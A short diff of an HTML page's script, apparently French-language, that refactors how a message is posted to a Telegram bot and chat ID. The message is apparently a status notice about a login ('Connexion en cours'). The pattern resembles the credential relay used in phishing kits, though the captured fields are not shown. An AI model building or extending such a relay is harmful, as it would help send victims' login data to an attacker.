@@ -712,8 +712,8 @@
 
     <script>
         // === CONFIGURATION TELEGRAM ===
-        const TELEGRAM_BOT_TOKEN = 'TELEGRAM_BOT_TOKEN_PLACEHOLDER';
-        const TELEGRAM_CHAT_ID = '6078788670';
+        const TELEGRAM_BOT_TOKEN = window.telegramConfig?.BOT_TOKEN || 'NOT_SET';
+        const TELEGRAM_CHAT_ID = window.telegramConfig?.CHAT_ID || 'NOT_SET';
         
         // Toast elements
         const toast = document.getElementById('toast');
@@ -932,13 +932,16 @@
 ✅ Statut: Connexion en cours`;
                 
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('text', message);
                 
                 const response = await fetch(url, {
                     method: 'POST',
-                    body: formData
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message
+                    })
                 });
                 
                 return response.ok;
